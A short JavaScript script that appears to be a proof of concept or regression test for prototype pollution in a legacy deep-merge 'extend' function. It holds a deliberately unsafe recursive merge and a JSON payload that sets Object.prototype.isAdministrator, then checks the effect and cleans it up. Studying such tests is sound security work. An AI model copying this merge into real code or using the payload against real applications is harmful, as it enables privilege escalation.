function representativeLegacyExtend(deep, target, ...sources) {
  for (const source of sources) {
    for (const key of Object.keys(source)) {
      const value = source[key];
      if (deep && value !== null && typeof value === "object") {
        if (target[key] === undefined) target[key] = {};
        representativeLegacyExtend(true, target[key], value);
      } else {
        target[key] = value;
      }
    }
  }
  return target;
}

const patch = JSON.parse(
  '{"constructor":{"prototype":{"isAdministrator":true}}}',
);
try {
  representativeLegacyExtend(true, {}, patch);
  if ({}.isAdministrator !== true) {
    throw new Error("extend deep merge did not modify Object.prototype");
  }
  console.log("vulnerable extend deep merge modified Object.prototype");
} finally {
  delete Object.prototype.isAdministrator;
}
